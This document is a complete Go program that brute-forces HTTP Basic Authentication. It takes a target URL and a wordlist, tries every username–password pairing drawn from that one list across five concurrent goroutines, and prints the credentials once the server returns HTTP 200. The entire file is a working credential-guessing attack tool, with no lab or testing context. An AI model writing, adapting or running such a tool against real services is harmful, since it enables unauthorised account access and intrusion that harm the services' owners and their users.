
package main

import (
	"log"
	"fmt"
	"os"
	"flag"
	"net/http"
	"strings"
)


type Options struct{
	url		string
	list	string
}


var OPTIONS = Options{}
var doneThread = make(chan bool)
var activeThread = 0
var maxThread = 5


func parseOptions() {
	if len(os.Args) != 5 {
		fmt.Printf("Usage: %s -url <URL> -list <LIST>\nPassword list should be separated with newline\n", os.Args[0])
		os.Exit(1)
	}

	flag.StringVar(&OPTIONS.url, "url", "", "URL string")
	flag.StringVar(&OPTIONS.list, "list", "", "Username and password list")
	flag.Parse()
}


func auth(username, password string, doneChan chan bool) {
	client := http.Client{}
	req, err := http.NewRequest("GET", OPTIONS.url, nil)
	if err != nil {
		log.Fatalln(err)
	}
	req.SetBasicAuth(username, password)
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	if resp.StatusCode == 200 {
		log.Printf("Found!\nusername=%s\npassword=%s\n", username, password)
		os.Exit(0)
	}
	doneChan <- true
}


func main() {
	parseOptions()
	buffer := make([]byte, 500000) // 500K(almost)
	file, err := os.Open(OPTIONS.list)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	EOB, err := file.Read(buffer)
	if err != nil {
		log.Fatalln(err)
	}

	list := strings.Split(string(buffer[:EOB]), "\n")
	for _,user := range list {
		for _,pass := range list {
			go auth(user, pass, doneThread)
			activeThread++
			if activeThread >= maxThread {
				<-doneThread
				activeThread -= 1
			}
		}
	}

	for activeThread > 0 {
		<-doneThread
		activeThread -= 1
	}
}